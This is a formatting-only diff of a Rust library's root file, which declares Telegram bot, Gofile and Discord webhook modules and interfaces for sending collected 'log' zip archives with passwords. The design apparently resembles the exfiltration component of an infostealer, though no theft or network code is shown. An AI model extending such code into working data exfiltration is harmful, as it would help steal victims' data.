@@ -1,11 +1,11 @@
 #![no_std]
 
 extern crate alloc;
-pub mod telegram_bot;
-pub mod gofile;
-pub mod size_fallback;
 pub mod discord_webhook;
 pub mod fallback;
+pub mod gofile;
+pub mod size_fallback;
+pub mod telegram_bot;
 
 use alloc::string::String;
 use alloc::sync::Arc;
@@ -18,7 +18,7 @@ use zip::ZipArchive;
 pub enum SendError {
     Network,
     UnsupportedLogFile,
-    LogFileTooBig
+    LogFileTooBig,
 }
 
 /// Represents the content of a log file to be sent or processed.
@@ -30,14 +30,14 @@ pub enum LogContent {
     ExternalLink((String, usize)),
 
     /// The raw bytes of a `.zip` log archive.
-    ZipArchive(Vec<u8>)
+    ZipArchive(Vec<u8>),
 }
 
 /// Represents a named log file with content.
 #[derive(new, Clone)]
 pub struct LogFile {
     name: Arc<str>,
-    content: LogContent
+    content: LogContent,
 }
 
 impl LogFile {
@@ -75,7 +75,12 @@ pub trait LogSender: Clone {
     /// # Returns
     ///
     /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(
+        &self,
+        log_file: LogFile,
+        password: Option<P>,
+        collector: &C,
+    ) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
         C: Collector;
@@ -100,7 +105,12 @@ pub trait LogSenderExt: LogSender {
     ///
     /// This method automatically extracts the password from the archive if one is set,
     /// and converts the archive into a [`LogContent::ZipArchive`].
-    fn send_archive<A, C>(&self, name: Arc<str>, archive: A, collector: &C) -> Result<(), SendError>
+    fn send_archive<A, C>(
+        &self,
+        name: Arc<str>,
+        archive: A,
+        collector: &C,
+    ) -> Result<(), SendError>
     where
         A: AsRef<ZipArchive>,
         C: Collector;
